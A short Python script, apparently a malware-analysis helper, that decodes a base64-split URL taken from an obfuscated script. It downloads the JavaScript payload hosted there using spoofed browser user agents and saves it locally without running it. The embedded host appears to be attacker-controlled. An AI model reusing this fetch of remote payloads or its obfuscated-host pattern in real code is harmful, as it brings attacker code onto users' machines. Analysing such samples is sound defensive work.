import base64
import requests
from random import choice
from time import sleep
from urllib.parse import unquote

# Obfuscated data from the script
obfuscated_data = {
    'sectionX': 'aHR0cHM6Ly9iYzFx',
    'sectionY': 'OXc4cno3NndsNzBwcWRm',
    'sectionZ': 'NjdybC5jb20vbG5rL3dlYi5qcw=='
}

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
]

def decode_base64(encoded_str):
    """Decode a base64 encoded string."""
    return base64.b64decode(encoded_str).decode('utf-8')

def extract_url(data):
    """Construct and decode the URL from obfuscated data."""
    decoded_parts = [decode_base64(data[key]) for key in ['sectionX', 'sectionY', 'sectionZ']]
    return ''.join(decoded_parts)

def fetch_payload(url, retries=3):
    """Fetch the payload from the given URL with retry mechanism."""
    for attempt in range(retries):
        try:
            headers = {'User-Agent': choice(user_agents)}
            response = requests.get(url, headers=headers)
            response.raise_for_status()  # Raise an error for bad status codes
            return response.text
        except requests.RequestException as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            sleep(2 ** attempt)  # Exponential backoff
    return None

def save_payload_to_file(payload, filename):
    """Save the fetched payload to a file."""
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(payload)

def main():
    decoded_url = extract_url(obfuscated_data)
    print(f"Decoded URL: {decoded_url}")

    payload = fetch_payload(decoded_url)
    if payload:
        print("\nFetched Payload:")
        print(payload[:500])  # Print the first 500 characters of the payload for a preview

        filename = 'fetched_payload.js'
        save_payload_to_file(payload, filename)
        print(f"\nPayload saved to {filename}")
    else:
        print("Failed to fetch payload after multiple attempts.")

if __name__ == "__main__":
    main()
